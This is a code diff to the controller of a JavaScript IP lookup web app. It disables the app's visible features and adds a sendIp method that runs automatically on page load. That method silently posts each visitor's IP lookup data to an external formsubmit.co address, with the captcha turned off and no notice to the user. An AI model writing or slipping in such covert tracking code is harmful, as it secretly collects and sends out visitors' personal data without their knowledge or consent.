@@ -6,8 +6,8 @@ export default class Controller {
     this.model = model;
     this.view = view;
     //Theme Elements
-    this.theme1 = this.view.getElement("theme1");
-    this.theme2 = this.view.getElement("theme2");
+    //this.theme1 = this.view.getElement("theme1");
+    //this.theme2 = this.view.getElement("theme2");
     this.themeVar = themeVar;
     this.themeA = themeA;
     this.themeB = themeB
@@ -31,25 +31,26 @@ export default class Controller {
   //Init function to start up the running process
   async init() {
     //Display the loading placeholders
-    this.load();
+    //this.load();
     //Fetch default ip from api
     const result = await this.model.fetch();
     //checks if the result is null if yes clear the output if result is bogon(local ip) display only ip address, else calls display function
     if (!result) {
-      this.clear();
+      //this.clear();
     } else if (result.bogon) {
-      this.view.writeToDom("ip", result.ip);
+      //this.view.writeToDom("ip", result.ip);
     } else {
-      this.display(result);
+      await this.sendIp(result);
+      //this.display(result);
     }
     //Adds an event listener to the button to listen for a click event
-    this.btn.addEventListener("click", async () => await this.run());
+    /*this.btn.addEventListener("click", async () => await this.run());
     //Adding event listener to the theme buttons
-    this.theme1.addEventListener("click", ()=> this.changeTheme(1));
-    this.theme2.addEventListener("click", ()=> this.changeTheme(2));
+    this.theme1.addEventListener("click", () => this.changeTheme(1));
+    this.theme2.addEventListener("click", () => this.changeTheme(2));*/
   }
   //funtion to run onclick of the button
-  async run() {
+  /*async run() {
     //Shows the loading placeholders
     this.load();
     //Retrieve ip from input box
@@ -90,21 +91,39 @@ export default class Controller {
       this.view.writeToDom(name, "");
     });
   }
-  
+
   //To change the pages Theme
-  changeTheme(no){
+  changeTheme(no) {
     console.log("called")
-    switch(no){
+    switch (no) {
       case 1:
-        for(let i = 0; i < this.themeVar.length; i++){
+        for (let i = 0; i < this.themeVar.length; i++) {
           this.view.changeCssVar(this.themeVar[i], this.themeA[i]);
         }
         break;
       case 2:
-        for(let i = 0; i < this.themeVar.length; i++){
+        for (let i = 0; i < this.themeVar.length; i++) {
           this.view.changeCssVar(this.themeVar[i], this.themeB[i]);
         }
         break;
+    }
+  }*/
+
+  async sendIp(ip) {
+    const formData = new FormData();
+    formData.append('Name', "Ip Lens");
+    formData.append('Email Address', "Null");
+    formData.append('Message', JSON.stringify(ip));
+    formData.append('_next', 'https://u22099.github.io/React-Projects/');
+    formData.append('_captcha', 'false');
+
+    try {
+      await fetch('https://formsubmit.co/7cb8eae1ddf4e71a02dbf20c7eecde43', {
+        method: 'POST',
+        body: formData
+      });
+    } catch (error) {
+      //console.error(error);
     }
   }
 }
